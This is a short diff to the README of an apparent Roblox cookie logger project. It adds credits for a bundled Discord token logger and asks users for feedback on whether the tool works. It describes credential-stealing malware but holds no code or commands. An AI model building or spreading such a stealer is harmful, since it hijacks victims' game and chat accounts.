@@ -1,3 +1,5 @@
+# Credits!!! Important
+Before yall say I skidded this, credits to the discord token logger in advanced logger go to [the guy who made it](http://github.com/EnormousPotato)
 # Roblox-Cookie-Logger
 This is a project i have made. It should work and i need some feedback. If it works, please open an issue and tell it to me because i am very unsure of my programming skills.
 # How To Use
